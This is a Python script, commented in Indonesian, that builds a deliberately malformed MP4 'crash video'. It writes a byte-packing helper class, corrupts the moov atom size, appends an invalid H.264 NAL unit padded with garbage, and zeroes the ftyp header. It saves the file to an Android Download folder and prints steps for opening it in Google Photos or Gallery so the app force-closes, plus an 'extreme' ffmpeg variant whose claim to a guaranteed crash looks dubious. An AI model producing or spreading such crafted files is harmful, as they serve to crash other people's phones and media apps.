#!/usr/bin/env python3
"""
BUFFER MAKER - PYTHON VERSION (Porting dari Node.js BufferMaker)
Membuat corrupt video dengan kontrol byte-level presisi
"""

import struct
import os
import subprocess
import shutil

class BufferMaker:
    """Python version of Node.js BufferMaker"""
    
    def __init__(self):
        self.buffer = bytearray()
    
    # ========== UNSIGNED ==========
    def UInt8(self, value):
        self.buffer.extend(struct.pack('>B', value))  # Big Endian
        return self
    
    def UInt16BE(self, value):
        self.buffer.extend(struct.pack('>H', value))
        return self
    
    def UInt32BE(self, value):
        self.buffer.extend(struct.pack('>I', value))
        return self
    
    def UInt16LE(self, value):
        self.buffer.extend(struct.pack('<H', value))
        return self
    
    def UInt32LE(self, value):
        self.buffer.extend(struct.pack('<I', value))
        return self
    
    # ========== SIGNED ==========
    def Int8(self, value):
        self.buffer.extend(struct.pack('>b', value))
        return self
    
    def Int16BE(self, value):
        self.buffer.extend(struct.pack('>h', value))
        return self
    
    def Int32BE(self, value):
        self.buffer.extend(struct.pack('>i', value))
        return self
    
    def Int16LE(self, value):
        self.buffer.extend(struct.pack('<h', value))
        return self
    
    def Int32LE(self, value):
        self.buffer.extend(struct.pack('<i', value))
        return self
    
    # ========== FLOAT ==========
    def FloatBE(self, value):
        self.buffer.extend(struct.pack('>f', value))
        return self
    
    def FloatLE(self, value):
        self.buffer.extend(struct.pack('<f', value))
        return self
    
    def DoubleBE(self, value):
        self.buffer.extend(struct.pack('>d', value))
        return self
    
    def DoubleLE(self, value):
        self.buffer.extend(struct.pack('<d', value))
        return self
    
    # ========== STRING / RAW ==========
    def string(self, value, encoding='utf-8'):
        self.buffer.extend(value.encode(encoding))
        return self
    
    def raw(self, bytes_data):
        self.buffer.extend(bytes_data)
        return self
    
    def make(self):
        return bytes(self.buffer)


# ============================================================
# CRASH VIDEO GENERATOR PAKAI BufferMaker STYLE
# ============================================================

def create_crash_video_bytelevel(input_video, output_video):
    """
    Bikin crash video dengan korupsi byte-level presisi
    Menggunakan konsep BufferMaker untuk menulis garbage di posisi tepat
    """
    
    # Copy original video dulu
    shutil.copy2(input_video, output_video)
    
    with open(output_video, "r+b") as f:
        file_size = f.tell()
        
        # ============================================
        # METHOD 1: Corrupt moov atom dengan BufferMaker
        # ============================================
        # Cari posisi moov
        f.seek(0)
        data = f.read(1024*1024)
        moov_pos = data.find(b"moov")
        
        if moov_pos != -1:
            # Pake BufferMaker untuk bikin corrupt payload
            corruptor = BufferMaker()
            corruptor.UInt32BE(0xFFFFFFFF)  # Invalid size (4GB)
            corruptor.UInt32BE(0xDEADBEEF)  # Magic garbage
            corruptor.string("CRASH_ME")
            
            f.seek(moov_pos - 4)
            f.write(corruptor.make())
            print(f"  ✓ moov corrupted at {moov_pos}")
        
        # ============================================
        # METHOD 2: Inject crash NALU di akhir
        # ============================================
        f.seek(0, 2)  # end of file
        
        nalu_crash = BufferMaker()
        nalu_crash.UInt32BE(0x00000001)      # NALU start code
        nalu_crash.UInt8(0x00)               # Invalid NALU type
        nalu_crash.UInt32BE(0xFFFFFFFF)      # Invalid length
        nalu_crash.string("X" * 10000)       # Garbage data
        
        f.write(nalu_crash.make())
        print(f"  ✓ Crash NALU injected: {len(nalu_crash.make())} bytes")
        
        # ============================================
        # METHOD 3: Corrupt ftyp header (optional)
        # ============================================
        f.seek(0)
        ftyp_check = f.read(8)
        if ftyp_check[4:8] == b"ftyp":
            f.seek(4)
            f.write(BufferMaker().UInt32BE(0x00000000).make())
            print(f"  ✓ ftyp header corrupted")


# ============================================================
# MAIN - BUAT VIDEO NORMAL DULU
# ============================================================

print("\n" + "="*60)
print("   BUFFER MAKER STYLE - Byte Level Corruption")
print("="*60)

# Bikin video normal pake ffmpeg
NORMAL_VIDEO = "lv_0_20260503222753.mp4"
OUTPUT_VIDEO = "buffered_videos/crash_bytelevel.mp4"

os.makedirs("buffered_videos", exist_ok=True)

print("\n[1] Creating normal video...")
subprocess.run([
    "ffmpeg", "-f", "lavfi", "-i",
    "testsrc=duration=8:size=640x480:rate=30",
    "-c:v", "libx264", "-preset", "ultrafast",
    "-movflags", "+faststart",
    "-y", NORMAL_VIDEO
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

print(f"    ✓ Normal video: {os.path.getsize(NORMAL_VIDEO)} bytes")

# Apply byte-level corruption
print("\n[2] Applying byte-level corruption (BufferMaker style)...")
create_crash_video_bytelevel(NORMAL_VIDEO, OUTPUT_VIDEO)

print(f"\n[✓] Crash video ready: {OUTPUT_VIDEO}")
print(f"    Size: {os.path.getsize(OUTPUT_VIDEO)} bytes")

# Copy ke Download
try:
    shutil.copy2(OUTPUT_VIDEO, f"/sdcard/Download/crash_bytelevel.mp4")
    print(f"\n[✓] Also copied to: /sdcard/Download/crash_bytelevel.mp4")
except:
    pass

print("\n" + "="*60)
print("   TEST INSTRUCTION:")
print("="*60)
print("""
1. Open with Google Photos or Gallery
2. Video will play normally for ~7 seconds
3. At last second: CRASH / Force Close

If still not working, try the EXTREME method below:
""")

# ============================================================
# EXTREME METHOD - Guaranteed crash (tapi file gede)
# ============================================================
print("\n" + "="*60)
print("   EXTREME METHOD (Guaranteed Crash):")
print("="*60)

extreme_code = '''
# Bikin video dengan 1000 frame terakhir corrupt via ffmpeg
subprocess.run([
    "ffmpeg", "-i", "normal.mp4",
    "-vf", "geq=r='if(lt(t,7),r(X,Y),255)':g='if(lt(t,7),g(X,Y),0)':b='if(lt(t,7),b(X,Y),0)'",
    "-c:v", "libx264", "-preset", "ultrafast",
    "-y", "crash_extreme.mp4"
])
'''

print(extreme_code)
